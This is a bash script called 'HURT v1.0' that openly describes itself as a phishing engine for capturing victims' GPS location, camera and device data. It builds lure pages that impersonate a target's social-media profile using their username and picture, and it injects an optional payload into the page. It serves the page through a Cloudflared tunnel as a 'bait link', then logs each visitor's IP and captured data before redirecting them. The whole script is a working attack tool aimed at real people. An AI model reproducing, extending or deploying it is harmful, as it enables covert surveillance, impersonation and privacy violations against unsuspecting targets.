#!/bin/bash
# HURT v1.0 – Multi‑template GPS & Camera Trap (FIXED)
# github.com/DawoodKhan5218

set -o pipefail
cd "$(dirname "$0")" || exit 1
trap 'printf "\n";stop' 2

banner() {
    clear
    printf '\n'
    printf '\e[1;31m       ██╗  ██╗ ██╗   ██╗ ██████╗  ████████╗\e[0m\n'
    printf '\e[1;31m       ██║  ██║ ██║   ██║ ██╔══██╗ ╚══██╔══╝\e[0m\n'
    printf '\e[1;31m       ███████║ ██║   ██║ ██████╔╝    ██║   \e[0m\n'
    printf '\e[1;31m       ██╔══██║ ██║   ██║ ██╔══██╗    ██║   \e[0m\n'
    printf '\e[1;31m       ██║  ██║ ╚██████╔╝ ██║  ██║    ██║   \e[0m\n'
    printf '\e[1;31m       ╚═╝  ╚═╝  ╚═════╝  ╚═╝  ╚═╝    ╚═╝   \e[0m\n\n'
    printf '\e[1;31m       ☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠\e[0m\n'
    printf " \e[1;91m      HURT v1.0 – The Phantom’s Embrace\e[0m \n"
    printf " \e[1;90m      github.com/DawoodKhan5218 \e[0m \n"
    printf "\e[1;91m A relentless phishing engine. GPS, camera, device – nothing escapes.\e[0m \n"
    printf "\e[1;90m           You don’t find victims. You hunt them.\e[0m \n"
    printf "\n"
}

dependencies() {
    command -v php  > /dev/null 2>&1 || { echo >&2 "I require php. Install it."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget. Install it."; exit 1; }
}

stop() {
    checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    if [[ $checkcf == *'cloudflared'* ]]; then
        pkill -f -2 cloudflared > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
    fi
    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;91m[☠\e[0m\e[1;77m+\e[0m\e[1;91m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[☠\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for prey… Press Ctrl + C to abort.\e[0m\n"
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;91m[☠\e[0m+\e[1;91m] Prey has taken the bait!\e[0m\n"
            catch_ip
            rm -rf ip.txt
            tail -f -n 110 data.txt
        fi
        sleep 0.5
    done
}

cf_server() {
    if [[ ! -e cloudflared ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared tunnel…\e[0m\n"
        arch=$(uname -m)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        if [[ "$arch" == *'aarch64'* ]]; then
            wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        elif [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
            wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        else
            wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
        fi
        chmod +x cloudflared
    fi

    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server…\e[0m\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Opening ghost tunnel…\e[0m\n"
    rm -f cf.log
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
    sleep 10
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Tunnel generation failed. Check your connection.\e[0m\n"
        exit 1
    else
        printf "\e[1;92m[\e[0m*\e[1;92m] Bait link ready:\e[0m\e[1;77m %s\e[0m\n" "$link"
    fi
    sed "s+forwarding_link+$link+g" template.php > index.php
    checkfound
}

local_server() {
    sed 's+forwarding_link++g' template.php > index.php
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on localhost:8080…\e[0m\n"
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    sleep 2
    checkfound
}

TEMPLATE_DIR="templates"

get_available_templates() {
    local files=()
    for f in "$TEMPLATE_DIR"/*.html; do
        [[ -f "$f" ]] || continue
        files+=("$(basename "$f")")
    done
    echo "${files[@]}"
}

select_template() {
    local choice
    local -a templates
    local count
    read -ra templates <<< "$(get_available_templates)"
    count=${#templates[@]}

    while true; do
        printf "\n\e[1;93mAvailable templates in '%s':\e[0m\n" "$TEMPLATE_DIR" >&2
        if [[ $count -eq 0 ]]; then
            printf "  \e[1;90m(no .html files found)\e[0m\n" >&2
        else
            for i in "${!templates[@]}"; do
                printf "  \e[1;92m%2d)\e[0m %s\n" $((i+1)) "${templates[$i]}" >&2
            done
        fi
        printf "  \e[1;92m%2d)\e[0m Custom (enter your own HTML file)\n" $((count+1)) >&2
        printf "  \e[1;92m 0)\e[0m Exit\n" >&2

        read -p "Choice: " choice

        if [[ ! "$choice" =~ ^[0-9]+$ ]]; then
            printf "\e[1;31m[!] Please enter a number.\e[0m\n" >&2
            continue
        fi
        if [[ "$choice" == "0" ]]; then
            exit 0
        elif [[ "$choice" == "$((count+1))" ]]; then
            read -p "Path to HTML file: " custom_path
            if [[ -f "$custom_path" ]]; then
                echo "$custom_path"
                return
            else
                printf "\e[1;31m[!] File not found.\e[0m\n" >&2
                continue
            fi
        elif [[ "$choice" -ge 1 && "$choice" -le "$count" ]]; then
            local selected="${templates[$((choice-1))]}"
            echo "${TEMPLATE_DIR}/${selected}"
            return
        else
            printf "\e[1;31m[!] Invalid choice. Pick a number between 0 and %d.\e[0m\n" "$((count+1))" >&2
        fi
    done
}

hurt() {
    if [[ -e data.txt ]]; then
        cat data.txt >> targetreport.txt
        rm -rf data.txt
        touch data.txt
    fi
    [[ -e ip.txt ]] && rm -rf ip.txt

    # 1. Select lure template
    LURE_FILE=$(select_template)
    LURE_FILE="${LURE_FILE//$'\r'/}"
    [[ ! -f "$LURE_FILE" ]] && { printf "\e[1;31m[!] Template missing: %s\e[0m\n" "$LURE_FILE"; exit 1; }

    # 2. Victim's name
    printf "\n\e[1;91m[?] HUNT USERNAME:\e[0m "
    read ig_username
    [[ -z "$ig_username" ]] && ig_username="User"
    printf "\e[1;92m[+] Prey locked: @%s\e[0m\n" "$ig_username"

    # 3. Profile picture (optional)
    mkdir -p profiles
    rm -f profiles/profile.jpg
    printf "\e[1;91m[?] PROFILE PIC URL (or path):\e[0m "
    read pic_input
    if [[ -n "$pic_input" ]]; then
        if [[ "$pic_input" =~ ^https?:// ]]; then
            printf "\e[1;92m[+] Snatching image…\e[0m\n"
            wget --no-check-certificate -U "Mozilla/5.0" -O profiles/profile.jpg "$pic_input" > /dev/null 2>&1
            if [[ ! -f profiles/profile.jpg ]] || [[ $(stat -c%s profiles/profile.jpg) -lt 100 ]]; then
                curl -L -A "Mozilla/5.0" -o profiles/profile.jpg "$pic_input" > /dev/null 2>&1
            fi
            [[ -f profiles/profile.jpg ]] && printf "\e[1;92m[+] Profile picture embedded.\e[0m\n" || printf "\e[1;31m[!] Failed to grab image.\e[0m\n"
        elif [[ -f "$pic_input" ]]; then
            cp "$pic_input" profiles/profile.jpg
            printf "\e[1;92m[+] Profile picture copied.\e[0m\n"
        else
            printf "\e[1;31m[!] File not found.\e[0m\n"
        fi
    fi

    # 4. Build final index.html
    cp "$LURE_FILE" index.html.tmp
    sed -i "s/__TARGET_USER__/$ig_username/g" index.html.tmp
    if [[ -f payload ]]; then
        if grep -q 'tc_payload' index.html.tmp; then
            sed -e '/tc_payload/r payload' index.html.tmp > index.html
        else
            sed -e '/<\/body>/i <!-- tc_payload -->' -e '/<!-- tc_payload -->/r payload' index.html.tmp > index.html
        fi
        rm index.html.tmp
    else
        mv index.html.tmp index.html
    fi

    # 5. Ask for redirect URL
    printf "\n\e[1;91m[?] Redirect URL after capture (default: https://www.google.com):\e[0m "
    read redirect_url
    redirect_url="${redirect_url:-https://www.google.com}"

    # Replace __REDIRECT_URL__ placeholder (preferred) and fallback to Google URL
    sed -i "s|__REDIRECT_URL__|$redirect_url|g" index.html
    # Also replace any hardcoded Google URL if still present (safety)
    sed -i "s|https://www.google.com|$redirect_url|g" index.html

    # 6. Tunnel selection
    default_option_server="Y"
    printf "\n\e[1;91m[?] Use ghost tunnel (Cloudflared)? [Y/n]:\e[0m "
    read option_server
    option_server="${option_server:-$default_option_server}"
    if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
        cf_server
    else
        local_server
    fi

    if [[ -n "$link" ]]; then
        printf "\e[1;92m[!] BAIT LINK:\e[0m %s?user=%s\n" "$link" "$ig_username"
    else
        printf "\e[1;92m[!] Local bait: http://localhost:8080?user=%s\e[0m\n" "$ig_username"
    fi
}

banner
dependencies
hurt
